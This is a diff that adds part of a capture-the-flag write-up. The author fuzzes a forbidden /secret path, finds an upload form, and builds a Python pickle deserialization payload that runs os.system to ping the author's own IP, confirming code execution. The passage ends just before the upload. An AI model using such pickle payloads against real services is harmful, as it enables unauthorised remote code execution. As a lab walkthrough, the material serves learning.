@@ -40,3 +40,34 @@ Checking */robots.txt* shows */secret*
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b6d8c8c-0285-4aec-bd2b-13f7bc04f112)
 
 But after navigating to */secret* gives 403 forbidden
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/add9bbf8-6807-4155-ae7d-659b2488e247)
+
+So I fuzzed for files there and got */upload*
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c1966332-64c8-4382-8ed7-75c9343d5055)
+
+Moving there shows an upload form 
+
+Now this is good cause remember from the main domain we can call any pickled file and since we are opportuned to upload any file lets upload a pickle file
+
+I made a script to make icmp callback to my host
+
+```python
+#!/usr/bin/python3
+# Author: Hack.You
+import os
+import pickle
+
+class Shell(object):
+    def __reduce__(self):
+        cmd = 'ping -c 5 10.2.42.156'
+        return (os.system, (cmd,))
+
+pickledData = pickle.dumps(Shell())
+with open('payload.pkl', 'wb') as f:
+    f.write(pickledData)
+```
+
+Running it creates the pickle file 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3d67b081-9fbf-44dd-92bf-e90fb55d9253)
+
+Now let upload the serialized payload
